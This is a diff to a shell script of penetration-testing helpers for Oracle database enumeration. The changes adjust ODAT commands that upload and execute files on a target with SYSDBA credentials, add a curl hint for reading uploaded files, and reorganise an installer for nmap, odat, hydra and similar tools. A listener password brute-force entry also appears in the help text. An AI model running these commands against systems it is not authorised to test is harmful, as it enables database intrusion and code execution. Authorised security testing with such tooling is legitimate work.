@@ -30,13 +30,20 @@ Commands
 nb-enum-oracle-install           installs dependencies
 nb-enum-oracle-nmap-sweep        scan a network for services
 nb-enum-oracle-tcpdump           capture traffic to and from a host
-nb-enum-oracle-sqlplus           sqlplus client
+nb-enum-oracle-sqlplus           connect using sqlplus client
 nb-enum-oracle-version           tnscmd version query
 nb-enum-oracle-status            tnscmd status query
 nb-enum-oracle-oscanner          oscanner enumeration
 nb-enum-oracle-hydra-listener    brute force passwords 
 
 DOC
+}
+
+nb-enum-oracle-install() {
+    __info "Running $0..."
+    __pkgs tcpdump nmap odat tnscmd10g sidguess oscanner hydra
+    __pkgs oracle-instantclient-sqlplus 
+    #sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"; sudo ldconfig
 }
 
 nb-enum-oracle-msf-sid() {
@@ -59,7 +66,10 @@ nb-enum-oracle-odat-upload() {
     nb-vars-set-pass
     __ask "Enter file to in current working directory to upload"
     local f && __askvar f "FILE"
-    print -z "./odat-libc2.17-x86_64 externaltable -s ${__RHOST} -p 1521 -U ${__USER} -P ${__PASS} -d XE --sysdba --exec /temp $f"
+    local sid && __askvar sid "SID(DATABASE)"
+    __info "You can read the file using curl"
+    __ok "  curl -X GET http://${__RHOST}/$f"
+    print -z "odat externaltable -s ${__RHOST} -p 1521 -U ${__USER} -P ${__PASS} -d ${sid} --sysdba --exec /temp $f"
 }
 
 nb-enum-oracle-odat-exec() {
@@ -69,23 +79,8 @@ nb-enum-oracle-odat-exec() {
     nb-vars-set-pass
     __ask "Enter file to in current working directory to execute"
     local f && __askvar f "FILE"
-    print -z "./odat-libc2.17-x86_64 utlfile -s ${__RHOST} -p 1521 -d XE -U ${__USER} -P ${__PASS} --sysdba --putFile /temp $f ./$f"
-}
-
-
-
-
-
-
-
-
-
-
-nb-enum-oracle-install() {
-    __info "Running $0..."
-    __pkgs tcpdump nmap odat tnscmd10g sidguess oscanner hydra
-    __pkgs oracle-instantclient-sqlplus 
-    sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"; sudo ldconfig
+    local sid && __askvar sid "SID(DATABASE)"
+    print -z "odat utlfile -s ${__RHOST} -p 1521 -d ${sid} -U ${__USER} -P ${__PASS} --sysdba --putFile /temp $f ./$f"
 }
 
 nb-enum-oracle-nmap-sweep() {
